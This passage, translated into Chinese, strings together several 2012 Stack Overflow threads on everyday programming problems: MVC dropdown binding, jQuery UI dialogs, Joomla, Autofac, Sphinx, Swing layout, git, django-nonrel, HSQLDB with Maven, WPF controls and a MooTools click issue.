```

请告诉我你想用那段代码做什么。

直到现在我认为你应该表现得像......

```
 <div class="editor-field">
                    @Html.DropDownListFor(model => model.ActivityID, new SelectList(Model.Activities,"ActivityID", "Name"),null, new {id = "activity"}) 
                    @Html.ValidationMessageFor(model=> model.ActivityID)
  </div> 
```

在 dropdownFor 表达式中，表达式应该用于您要在其中发布该数据的字段。我的意思是，如果您编写 model => model.Activity，则该值将传递给 Activity，如果您编写 model => model.ActivityID，则该值将传递给 ActivityID。

乍一看，它看起来像那样..如果不是那样。请分享您的 Hour Modal 取决于哪个编辑视图。这样我们就可以准确地得出结论。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-16T06:49:44.760

我收到了您的电子邮件，但我无法访问您的项目。对此感到抱歉。我正在努力尽快得到它。同时我发现您的问题是......

在 View SelectList 中应该绑定您要引用的活动。这就是为什么我在这里将其更改为 Activity.Project.Activity。如果您以其他方式曝光它，您可以根据您的曝光进行更改。

如果您只需要特定项目的活动，请使用此

```
 <div class="editor-field">
                    @Html.DropDownListFor(model => model.Activity.ActivityID, new SelectList(Model.Activity.Project.Activity as IEnumerable,"ActivityID","Name"),null, new {id ="Activity"})
                    @Html.ValidationMessageFor(model=> model.ActivityID)
 </div> 
```

现在，您的 get [GET] Edit 方法不应该提供任何数据，因为小时模型将提供活动列表。如果您想传递模型外的另一个活动集合，则传入 Viewbag。然后你的小时控制器 [GET] 编辑方法将如下所示......

```
 public ActionResult Edit(int id)
        {
            Hour hour = db.Hours.Find(id);
            ModelState.AddModelError("Name", "What a nice name");
            return View(hour);
        } 
```

如果您对模型以外的绑定进行了额外的练习，那么对于 post 方法也是如此，那么如果您有相同的视图作为响应，则必须重复它。post 方法看起来像这样....

```
 [HttpPost]
    public ActionResult Edit(Hour hour)
    {
        if (ModelState.IsValid)
        {
            db.Entry(hour).State = EntityState.Modified;
            db.SaveChanges();
            return RedirectToAction("Index");
        }
        ViewBag.WeekID = new SelectList(db.Weeks, "WeekID", "WeekID", hour.WeekID);
        ViewBag.Projects = db.Projects.ToList();
        ViewBag.Activities = db.Activities.ToList();
        return View(hour);
    } 
```

这将解决您的项目特定活动问题和两次发布问题可用的绑定。在我可以访问您的项目之前，请发布您的进一步问题，以便我可以在这里告诉您。当 ViewModelState 说有任何错误时，它也会说该属性，因此很容易解决。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-12T07:56:20.613

好的.....所以用这个替换你的活动下拉列表......

```
 <div class="editor-field">
                    @Html.DropDownListFor(model => model.Activity.ActivityID, new SelectList(ViewBag.Activities as IEnumerable,"ActivityID","Name"),null, new {id ="Activity"})
                    @Html.ValidationMessageFor(model=> model.ActivityID)
 </div> 
```

您不是在 Hour 模型中而是在 Activity 模型中收到 ActivityID null 错误。据说它是一个键，因此在绑定模型时它不能为空。上面的代码将绑定它，我希望你不会在 ModelState 中得到任何错误。

如果您遇到任何进一步的绑定错误，请让我知道 ModelState 中的哪个属性抛出错误。

# php - 如何使用 jquery 在 php 中创建多级模式弹出窗口？

> ID：11396194
> 
> 赞同：0
> 
> 时间：2012-07-09T13:38:21.617
> 
> 标签：php, jquery, modal-dialog

更准确地说，我想生成模态弹出窗口（称为 A），并且在该模态弹出窗口中我有一个按钮，单击该按钮时我想调用另一个模态弹出窗口（B），在此期间模态弹出窗口 A 应该保留在后面. 当我关闭模式弹出 B 时，A 应该激活。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:00:42.433

使用**[jQuery 用户界面](http://jqueryui.com/)**。它对对话框上的对话框具有本机支持。

看看这个[简单的例子](http://jsfiddle.net/Qrqbq/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:43:04.053

看看[JQuery UI 对话框](http://jqueryui.com/demos/dialog/)- 您可以同时打开多个对话框，无论是否有模式，有按钮或没有按钮......非常好的控件，应该是您正在寻找的。

您可以在对话框上访问诸如打开、关闭和聚焦（以及其他）之类的事件，以处理不同的操作以响应不同的操作，并且有一些方法可以打开/关闭/获取焦点等 - 所以它应该拥有你的一切我要求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T13:45:09.577

使用 jQuery UI 对话框的基本示例：

```
$( ".selector" ).dialog({ 
    modal: true,
    buttons: [
        {
            text: "Open Next",
            click: function() { 
                $( ".selector" ).dialog({
                    modal: true
                });
            }
        }
    ] 
}); 
```

# joomla2.5 - Joomla Facebook 登录

> ID：11396200
> 
> 赞同：-4
> 
> 时间：2012-07-09T13:38:44.983
> 
> 标签：joomla2.5

我正在使用 joomla 2.5 创建一个真实状态的网站，但我遇到了 Facebook 登录集成的问题。谁能建议我使用哪个模块或插件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:42:23.533

使用组件[JFBConnect](http://extensions.joomla.org/extensions/social-web/social-display/facebook-integration/7215)。它将在 Joomla 2.5 中支持

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-12T16:40:13.700

还有一个又好又便宜的扩展[Facebook All](http://extensions.joomla.org/extensions/access-a-security/site-access/authentication-cloud-based/22865)现在也可以免费扩展

# dependency-injection - 无法在使用依赖注入的构造函数中初始化变量

> ID：11396203
> 
> 赞同：1
> 
> 时间：2012-07-09T13:38:59.900
> 
> 标签：dependency-injection, constructor, autofac

我有一个从依赖注入框架（Autofac）获取其依赖关系的构造函数。问题是除了获取这些依赖项之外，我无法在构造函数中执行任何其他操作，如果我在构造函数中编写除了那些依赖项分配之外的任何语句，我会收到以下错误：-

`No parameter less constructor is defined for this object`

我必须评论下面显示的只读字符串的分配才能使它起作用：-

```
public RelationshipController(ICustomerService customerService,)
{
   this.customerService = customerService;
   //someReadonlyString = "abcd";
} 
```

谁能告诉我，发生了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T16:55:34.567

当在`ICustomerService`容器中找不到请求的服务（在本例中为 ）时，Autofac 将继续寻找默认的（也就是无参数的）构造函数。您显然没有默认构造函数，因此 Autofac 会出现异常。

我的猜测是，这里真正的错误在于接口的注册码`ICustomerService`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-24T19:34:40.697

我看到一个RelationshipController，这可能意味着您正在使用ASP.NET MVC。您可能没有在 MVC 中正确注册 Autofac。在这种情况下，MVC 将不会使用 Aufofac，只能使用默认构造函数。

# sphinx - Sphinx搜索调试

> ID：11396207
> 
> 赞同：0
> 
> 时间：2012-07-09T13:39:09.837
> 
> 标签：sphinx

我们在工作中使用[Sphinx Search](http://sphinxsearch.com/)，但我在设置新索引时遇到了问题。有谁知道一种工具或技术可以让我查看存储在 Sphinx 中的数据？

基本上我想做一些类似的事情 - “显示索引'X'中的前5条记录”，只是为了确保它实际上正在存储数据。目前我大约 90% 确定我的查询代码是正确的，但无法知道我的索引是否正确。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T18:44:06.500

* **SELECT * FROM index_name***在 Sphinx 端应该给你一个 ID 列表。这需要在 Sphinx conf 文件中启用 MySQL 协议支持：

```
listen = 9306:mysql41 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-23T02:14:04.143

要在索引中查找 Id，您可以执行以下操作：

/usr/local/sphinx/bin/indextool -c /usr/local/sphinx/etc/sphinx.conf --dumpdocids 索引名

# java - Java JLabel setHorizo ntalAlignment 结果不同

> ID：11396209
> 
> 赞同：2
> 
> 时间：2012-07-09T13:39:11.133
> 
> 标签：java, swing, alignment, jlabel, border-layout

我想在 BorderLayout 中将 JLabel 居中。现在我使用`label.setHorizontalAlignment(SwingConstants.CENTER);`and `label.setVerticalAlignment(SwingConstants.BOTTOM);`。

这里是完整的代码：

```
public class JSector extends JRenderPanel implements WarpGateConstants {

private Sector sector;

private JLabel jLabelSectorName;
private JLabel[] jLabelWarpGate;

public JSector(Sector s) {
    super(new BorderLayout());
    this.setSector(s);
    setBorder(new EmptyBorder(5, 5, 5, 5));

}

@Override
public void paintView(Graphics2D g) {
    g.setColor(getBackground());
    g.fillRoundRect(0, 0, getWidth() - 1, getHeight() - 1, getWidth() / 3, getHeight() / 3);
    g.setColor(getForeground());
    g.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, getWidth() / 3, getHeight() / 3);
}

private void setSector(Sector s) {
    this.sector = s;
    drawSectorInfo(s);
}

public Sector getSector() {
    return sector;
}

private void drawSectorInfo(Sector s) {
    removeAll();
    if (jLabelSectorName == null || jLabelWarpGate == null) {
        this.jLabelWarpGate = new JLabel[WARPGATE_MAX_VALUE + 1];
        this.jLabelWarpGate[WARPGATE_NORTH] = new JLabel("N");
        this.jLabelWarpGate[WARPGATE_EAST] = new JLabel("E");
        this.jLabelWarpGate[WARPGATE_SOUTH] = new JLabel("S");
        this.jLabelWarpGate[WARPGATE_WEST] = new JLabel("W");

        for (byte i = 0; i < jLabelWarpGate.length; i++) {
            setupLabel(jLabelWarpGate[i], i);
        }

        this.jLabelSectorName = new JLabel("SectorName");

        add(this.jLabelWarpGate[WARPGATE_NORTH], BorderLayout.NORTH);
        add(jLabelWarpGate[WARPGATE_EAST], BorderLayout.EAST);
        add(jLabelWarpGate[WARPGATE_SOUTH], BorderLayout.SOUTH);
        add(jLabelWarpGate[WARPGATE_WEST], BorderLayout.WEST);
        add(jLabelSectorName, BorderLayout.CENTER);

    }
    for (byte i = 0; i < jLabelWarpGate.length; i++) {
        WarpGate gate = s.getWarpGate(i);
        if (gate != null && gate.exists()) {
            jLabelWarpGate[i].setToolTipText("TargetSector: " + gate.getTargetGridPos());
            jLabelWarpGate[i].setVisible(true);
        } else {
            jLabelWarpGate[i].setVisible(false);
        }
    }
    jLabelSectorName.setText(s.getName());

}

private static JLabel setupLabel(JLabel label, byte warpGateID) {
    Font font = label.getFont();
    font = new Font(font.getName(), Font.BOLD, font.getSize() + 2);
    label.setFont(font);
    label.setForeground(new Color(255, 150, 0));
    label.setBackground(new Color(0, 100, 255, 150));
    label.setOpaque(true);

    switch (warpGateID) {
        case WARPGATE_NORTH:
            label.setHorizontalAlignment(SwingConstants.CENTER);
            label.setVerticalAlignment(SwingConstants.TOP);
            break;
        case WARPGATE_EAST:
            label.setHorizontalAlignment(SwingConstants.RIGHT);
            label.setVerticalAlignment(SwingConstants.CENTER);
            break;
        case WARPGATE_SOUTH:
            label.setHorizontalAlignment(SwingConstants.CENTER);
            label.setVerticalAlignment(SwingConstants.BOTTOM);
            break;
        case WARPGATE_WEST:
            label.setHorizontalAlignment(SwingConstants.LEFT);
            label.setVerticalAlignment(SwingConstants.CENTER);
            break;

    }
    return label;
}

} 
```

它工作得很好，但西门和东门有不同的垂直位置：

![西门和东门有不同的垂直位置](../Images/5e6d89cd3006f685fee840d3d94fdd6b.png)

我希望你能帮我解决这个问题

**编辑：**我想我发现了问题。我设置了一些可见的标签（假），这导致了问题。但是问题仍然存在，我如何将这些 Jlabels 放在同一行。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:33:09.237

我找到了（一个）对我有用的解决方案：

```
label.setForeground(new Color(255, 255, 255, 0)); 
```

这让组件“出现”但什么也不显示=>每个 JLabel 都在同一级别

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-09T14:15:49.937

如果 BorderLayout 的北或南“槽”中没有组件，则 East 和 West 组件将扩展以填充该空间，导致该组件的中心取决于其他组件是否可见。

想到了三种可能的解决方案，按复杂程度排列：

*   始终显示所有标签，但如果该边缘上没有门，则替换内容以使它们看起来不可见。您必须手动设置高度以使其保持一致，但这对于原型设计来说是可以的。
*   使用不同的 LayoutManager（虽然没有特别合适的想法）
*   绘制扇形而不依赖嵌套组件来表示门，手动进行必要的计算。

我现在可能会坚持第一个选项，稍后过渡到第三个选项。

# git - 如何在本地存储库中创建新分支，从远程分支获取代码而不进行任何合并

> ID：11396215
> 
> 赞同：0
> 
> 时间：2012-07-09T13:39:34.597
> 
> 标签：git, github

我在远程存储库上有一个分支，我想把那个分支带到本地，这样我就可以做一个变基。我添加了名为 github 的远程分支的 repo。如果我做

```
git checkout -b feature/AIOEC-168
git pull github feature/AIOEC-168 
```

发生合并。我想在本地复制 feature/AIOEC-168，然后在那个分支上做`git rebase develop`，我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:38:32.040

如果您想要远程分支的本地版本，也将远程分支设置为上游，请使用`git checkout`'`--track`标志：

```
git checkout --track github/feature/AIOEC-168 
```

这将`feature/AIOEC-168`在本地创建，它将与`github`远程版本相同（并且还将将该版本设置为上游跟踪分支），并且您可以使用任何您想要的 rebase 命令从那里进行 rebase。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T13:44:00.787

而不是`git pull`尝试[`git fetch`](http://www.kernel.org/pub/software/scm/git/docs/git-fetch.html)：

```
git fetch github
git rebase github/feature/AIOEC-168 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-10T01:08:50.183

在任何最新版本的 git 上，您都可以`git checkout feature/AIOEC-168`使用 ，它将检测到其中的同名分支`origin`并创建一个同名的本地分支，并跟踪该`origin`分支。

# django - 将 Django nonrel 与 Google App Engine 结合使用有哪些限制？

> ID：11396216
> 
> 赞同：1
> 
> 时间：2012-07-09T13:39:34.747
> 
> 标签：django, google-app-engine, google-cloud-datastore, python-2.7

我知道完整的 django 可以与 CloudSQL 一起使用。但我对使用 HRD 很感兴趣。我想了解更多关于 django 可以与 nonrel 一起使用的百分比。中间件有用吗？该框架的其他功能如何，例如 i18n、表单等。nonrel 也可以与 NDB 一起使用吗？

这里的背景是我什至使用过 webapp2 和之前的 webapp 并发现它们很棒，直到你的项目变得更大。所以对于这个项目，我有兴趣重新评估其他选项。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T15:54:21.290

最大的限制是数据存储不做 JOIN，所以任何使用 JOINS 的东西，比如多对多关系都不起作用。

任何使用多对多的包/中间件都不起作用，但其他的会。

例如，会话/身份验证中间件将起作用。但是，如果您将权限与 auth 一起使用，则不会。如果您使用管理页面进行身份验证，它们会使用权限，因此您也会遇到一些麻烦。

i8n 有效。

表格工作。

nonrel 不适用于 ndb。

我不知道您所说的“直到您的项目变得更大”是什么意思。django-nonrel 对你的应用程序的大小没有帮助。

在我看来，使用 nonrel 有两个主要原因：

1.  您对 App Engine 不置可否。Nonrel 可能允许您迁移到 MongoDB 作为后端。

2.  您想“免费”使用 django 包。例如，我为 REST API 使用了 sweetpie，使用 django-social-auth 轻松获得了 FB/Twitter 登录的 OAuth。（另一方面，在 1.7.0 中，他们使用端点解决了 REST API）

# sql - 在 Maven 测试阶段为测试目的初始化数据库

> ID：11396219
> 
> 赞同：2
> 
> 时间：2012-07-09T13:39:42.630
> 
> 标签：sql, spring, unit-testing, maven, hsqldb

我正在尝试执行以下操作：

*   在 mvn 测试阶段执行一些数据库脚本到 hsqldb

*   将该数据库用于测试目的

    我能够配置 maven，以便每次调用测试阶段时所有脚本都成功执行，但是（当然有一个 BUT），我所有的测试都失败了。

我的配置：

pom.xml

```
<build>
    <plugins>
        <!-- Plugin maven for sql -->
        <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>sql-maven-plugin</artifactId>

            <dependencies>
                <!-- Dependency to jdbc driver -->
                <dependency>
                    <groupId>org.hsqldb</groupId>
                    <artifactId>hsqldb</artifactId>
                    <version>${hsql-version}</version>
                </dependency>
            </dependencies>
            <configuration>
                <source>1.5</source>
                <target>1.5</target>
                <encoding>UTF-8</encoding>
                <driver>org.hsqldb.jdbcDriver</driver>
                <url>jdbc:hsqldb:mem:sweetdev_skill_db;shutdown=false</url>
                <settingsKey>hsql-db-test</settingsKey>
                <!--all executions are ignored if -Dmaven.test.skip=true-->
                <skip>${maven.test.skip}</skip>
            </configuration>
            <executions>
                <!--  Create integration test data before running the tests -->
                <execution>
                    <id>create-integration-test-data</id>
                    <phase>process-test-resources</phase>
                    <inherited>true</inherited>
                    <goals>
                        <goal>execute</goal>
                    </goals>
                    <configuration>
                        <url>jdbc:hsqldb:mem:db;shutdown=false</url>
                        <autocommit>true</autocommit>
                        <orderFile>ascending</orderFile>
                        <fileset>
                            <basedir>${basedir}/src/test/resources/sql</basedir>
                            <includes>
                                <include>create.sql</include>
                                <include>insert.sql</include>
                            </includes>
                        </fileset>
                    </configuration>
                </execution>

                <!--  Drop data after executing tests -->
                <execution>
                    <id>drop-db-after-test</id>
                    <phase>post-integration-test</phase>
                    <goals>
                        <goal>execute</goal>
                    </goals>
                    <configuration>
                        <orderFile>ascending</orderFile>
                        <fileset>
                            <basedir>${basedir}/src/test/resources/sql</basedir>
                            <includes>
                                <include>drop.sql</include>
                            </includes>
                        </fileset>
                    </configuration>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build> 
```

用于测试的弹簧配置：

```
<bean id="datasource"
    class="org.springframework.jdbc.datasource.DriverManagerDataSource">
    <property name="driverClassName" value="org.hsqldb.jdbcDriver">
    </property>
    <property name="url" value="jdbc:hsqldb:mem:db"></property>
    <property name="username" value="sa">
    </property>
    <property name="password" value="">
    </property>
</bean>

<bean id="entityManagerFactory"
    class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
    <property name="dataSource" ref="datasource" />
    <!-- use testingSetup pu -->
    <property name="persistenceUnitName" value="testingSetup" />
    <property name="persistenceXmlLocation" value="persistence.xml" />
    <property name="jpaVendorAdapter">
        <bean class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter">
            <property name="showSql" value="true" />
            <property name="databasePlatform" value="org.hibernate.dialect.HSQLDialect" />
            <property name="generateDdl" value="true" />
        </bean>
    </property>
</bean>

<tx:annotation-driven transaction-manager="transactionManager" />
<bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager">
    <property name="entityManagerFactory" ref="entityManagerFactory" />
</bean> 
```

输出 ：

```
 [INFO] ------------------------------------------------------------------------
    [INFO] [clean:clean]
    [INFO] Deleting directory D:\dev\projects\project-data\target
    [INFO] [resources:resources]
    [INFO] Using default encoding to copy filtered resources.
    [INFO] [compiler:compile]
    [INFO] Compiling 62 source files to D:\dev\projects\project-data\target\classes
    [INFO] [resources:testResources]
    [INFO] Using default encoding to copy filtered resources.
    [INFO] [sql:execute {execution: create-integration-test-data}]
    [INFO] Executing file: D:\dev\projects\project-data\src\test\resources\sql\create.sql
    [INFO] Executing file: D:\dev\projects\project-data\src\test\resources\sql\insert.sql
    [INFO] 230 of 230 SQL statements executed successfully
    [INFO] [compiler:testCompile]
    [INFO] Compiling 12 source files to D:\dev\projects\project-data\target\test-classes
    [INFO] [surefire:test]
    [INFO] Surefire report directory: D:\dev\projects\project-data\target\surefire-reports 
```

但后来我所有的测试都失败了。我需要您的帮助来弄清楚它为什么不起作用并帮助我找到解决方案。谢谢

* * *

@AndrewLogvinov

这是测试输出之一：

```
 -------------------------------------------------------------------------------
    Test set: com.ideo.sweetdevskill.data.impl.TestAcquisitionDAOImpl
    -------------------------------------------------------------------------------
    Tests run: 2, Failures: 0, Errors: 2, Skipped: 0, Time elapsed: 0.17 sec <<< FAILURE!
    testGetListAcquisitionByUser(com.ideo.sweetdevskill.data.impl.TestAcquisitionDAOImpl)  Time elapsed: 0.148 sec  <<< ERROR!
    java.lang.IndexOutOfBoundsException: Index: 0, Size: 0
        at java.util.ArrayList.RangeCheck(ArrayList.java:547)
        at java.util.ArrayList.get(ArrayList.java:322)
        at com.ideo.sweetdevskill.data.impl.TestAcquisitionDAOImpl.testGetListAcquisitionByUser(TestAcquisitionDAOImpl.java:100)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:585)
        at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:44)
        at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
        at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:41)
        at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
        at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
        at org.springframework.test.context.junit4.statements.RunBeforeTestMethodCallbacks.evaluate(RunBeforeTestMethodCallbacks.java:74)
        at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:31)
        at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:82)
        at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:72)
        at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:240)
        at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:46)
        at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:180)
        at org.junit.runners.ParentRunner.access$000(ParentRunner.java:41)
        at org.junit.runners.ParentRunner$1.evaluate(ParentRunner.java:173)
        at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
        at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61)
        at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:31)
        at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70)
        at org.junit.runners.ParentRunner.run(ParentRunner.java:220)
        at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:180)
        at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:62)
        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:140)
        at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:127)
        at org.apache.maven.surefire.Surefire.run(Surefire.java:177)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:585)
        at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:338)
        at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:997) 
```

谢谢 ！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-10T00:31:01.747

比较配置中的这些行。数据库名称不同，因此使用了两个不同的数据库。

```
<url>jdbc:hsqldb:mem:sweetdev_skill_db;shutdown=false</url>

<property name="url" value="jdbc:hsqldb:mem:db"></property> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T09:30:44.810

我已承诺发布解决方案，所以我来了。

让我们从春季配置开始

```
 <?xml version="1.0" encoding="UTF-8"?>
<!--beans followed by all xml schemas here -->
    <!-- HSQL datasource for test purpose-->
    <bean id="datasource"
        class="org.springframework.jdbc.datasource.DriverManagerDataSource">
        <property name="driverClassName" value="org.hsqldb.jdbcDriver" />
        <property name="url" value="jdbc:hsqldb:file:db" />
        <property name="username" value="sa" />
        <property name="password" value="" />
    </bean>

    <!-- ============================ ENTITY MANAGER    ================================= -->
    <bean id="entityManagerFactory"
        class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
        <property name="dataSource" ref="datasource" />
        <!-- use testingSetup pu -->
        <property name="persistenceUnitName" value="testingSetup" />
        <property name="persistenceXmlLocation" value="persistence.xml" />
        <property name="jpaVendorAdapter">
            <bean class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter">
                <property name="showSql" value="false" />
                <property name="databasePlatform" value="org.hibernate.dialect.HSQLDialect" />
                <property name="generateDdl" value="false" />
            </bean>
        </property>
    </bean>
<!-- all other things you may need-->
</beans> 
```

persistence.xml 将具有与项目的 pom.xml 中的应用程序相同的结构：（我在这里只包括相关部分：

```
 <!-- Plugin maven for sql -->
        <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>sql-maven-plugin</artifactId>
            <dependencies>
                <!-- Dependency to jdbc driver -->
                <dependency>
                    <groupId>org.hsqldb</groupId>
                    <artifactId>hsqldb</artifactId>
                    <version>${hsql-version}</version>
                </dependency>
            </dependencies>
            <configuration>
                <source>1.5</source>
                <target>1.5</target>
                <encoding>UTF-8</encoding>
                <driver>org.hsqldb.jdbcDriver</driver>
                <url>jdbc:hsqldb:file:${basedir}/db;shutdown=true</url>
                <autocommit>true</autocommit>
                <settingsKey>hsql-db-test</settingsKey>
                <!--all executions are ignored if -DskipTests=true-->
                <skip>${skipTests}</skip>
            </configuration>
            <executions>
                <!--  Create test data before running the tests -->
                <execution>
                    <id>create-test-compile-data</id>
                    <phase>process-test-sources</phase>
                    <inherited>true</inherited>
                    <goals>
                        <goal>execute</goal>
                    </goals>
                    <configuration>
                        <url>jdbc:hsqldb:file:${basedir}/db;shutdown=true</url>
                        <driver>org.hsqldb.jdbcDriver</driver>

                        <orderFile>ascending</orderFile>
                        <detail>true</detail>
                        <fileset>
                            <basedir>${basedir}/src/test/resources/sql</basedir>
                            <includes>
                                <include>script-create.sql</include>
                                <include>script-insert.sql</include>
                            </includes>
                        </fileset>
                        <autocommit>true</autocommit>
                    </configuration>
                </execution>
                <!--  Drop test data after running the tests include hereafter -->

        </plugin> 
```

谢谢你的帮助。

# c# - 如何从后面的代码或通过绑定刷新 WPF 中的自定义用户控件

> ID：11396221
> 
> 赞同：0
> 
> 时间：2012-07-09T13:40:02.350
> 
> 标签：c#, .net, wpf, wcf

我有一个 TabControl，用户控件位于 TabItem 内容中，如下所示：

```
\\...
<TabItem.Content>
<vm:myUserControl />
</TabItem.Content>
\\...
<TabItem.Content>
<vm:otherUserControl/>
</TabItem.Content> 
```

`myUserControl`当我更改数据时如何更新`otherUserControl`（例如在列表中添加必须显示的元素 `myUserControl`）。此控件具有不同的数据上下文（来自不同的 viem 模型类，谁继承`BaseViewModel`. 谁推动`INotifyPropertyChanged`）。数据由 WCF 客户端服务提供。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T13:59:24.687

有多种方法可以实现这一目标。一种方法是触发一个事件`otherUserControl`并订阅你的事件`MainWindow`并允许你`MainWindow`更新`myUserControl`.

**我的用户控件 XAML**

```
<TextBlock x:Name="TextValue">Initial Text</TextBlock> 
```

**其他用户控件 XAML**

```
<Button Click="Button_Click">Click Me</Button> 
```

**其他用户控件 C#**

```
public event EventHandler ButtonClicked;

private void Button_Click(object sender, RoutedEventArgs e)
{
    if(this.ButtonClicked != null)
    {
        this.ButtonClicked(this, EventArgs.Empty);
    }
} 
```

**主窗口 XAML**

```
<StackPanel>
    <vm:MyUserControl x:Name="MyUserControl"/>
    <vm:OtherUserControl x:Name="OtherUserControl"/>
</StackPanel> 
```

**主窗口 C#**

```
public MainWindow()
{
    InitializeComponent();
    this.OtherUserControl.ButtonClicked += OtherUserControl_ButtonClicked;
}

void OtherUserControl_ButtonClicked(object sender, EventArgs e)
{
    this.MyUserControl.TextValue.Text = "Updated Text";
} 
```

另一种选择是使用诸如[Prism 事件聚合器](http://compositewpf.codeplex.com/wikipage?title=Event%20Aggregator)之类的东西，它允许`MyUserControl`订阅由引发的事件，`OtherUserControl`而无需`MainWindow`设置两者之间的通信。对于大型项目，这是一个更好的选择，因为它允许您的组件真正松散耦合。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T13:58:07.397

您可以使用 Mediator/Messenger 或 EventAggregator。因此您的 otherUsercontrol 引发消息/事件，并且您的 myUserControl 订阅并对此消息/事件作出反应。

或者，如果您不想松散耦合，您当然可以直接耦合您的两个视图模型并使用一些事件。

# javascript - button.click 仅在前面有 alert 的情况下执行

> ID：11396222
> 
> 赞同：0
> 
> 时间：2012-07-09T13:40:10.603
> 
> 标签：javascript, ajax, mootools, mootools-events

首先：
此页面适用于在线药店。
我们正在使用一个小脚本从保险公司检索一些数据，以确保用户实际拥有保险。

在我们的一个页面上，我们有 2 个文本字段和一个按钮。文本字段向`.click()`按钮发送 a 以检索一些信息，但前提是它们都填充了正确类型的数据。
这有效。

为了提高我们网站的可用性，我们正在创建一个通过不同页面的流程。前面描述的页面就是其中之一。我确信所需的信息总是在 2 个文本字段中，所以我使用 JavaScript 将 a 发送`.click()`到按钮。但不知何故`$('ZK').click();`不起作用，但`alert(); $('ZK').click();`确实如此。

有没有人能够向我解释为什么第一个不起作用而第二个不起作用？也许还有我如何解决这个小问题？

有什么与`.click()`没有事件或什么的吗？

此页面内的代码：（未间接加载）

文本字段和按钮：

```
<INPUT onkeypress="return noenter()"  
       onkeydown="return isNumericKey(event)"  
 TYPE="TEXT"  
 class="ajaxsearch"  
 name="DOB" id="DOB"  
 value="<%=DOB%>"  
 MAXLENGTH="8"  
 style="width:60px;height:18px"  
 onkeyup="javascript:if ($(DOB).get('value').length==8 &&  
                         $(DOB).get('value')!='ddmmjjjj')
 {  
   var myFx=new Fx.Tween($(DOB));  
   myFx.set('color','#000066');  
   $('ZK').click();  
 } else {  
   var myFx=new Fx.Tween($(DOB));  
   myFx.set('color', '#cc0000');  
 };">  `

<INPUT url="?NC=<%=Rnd(Now)%>"  
 TYPE="BUTTON"  
 NAME="ZK" ID="ZK"  
 VALUE="Zoek mij"  
 class="button"  
 style="width:70px;height:22px"> 
```

调用脚本：

```
 if ($('DOB').get('value').length==8 
      && $('DOB').get('value')!='ddmmjjjj') 
  {
    var myFx=new Fx.Tween($('DOB'));
    myFx.set('color', '#000066');
    //alert();
    $('ZK').click();
   } else {
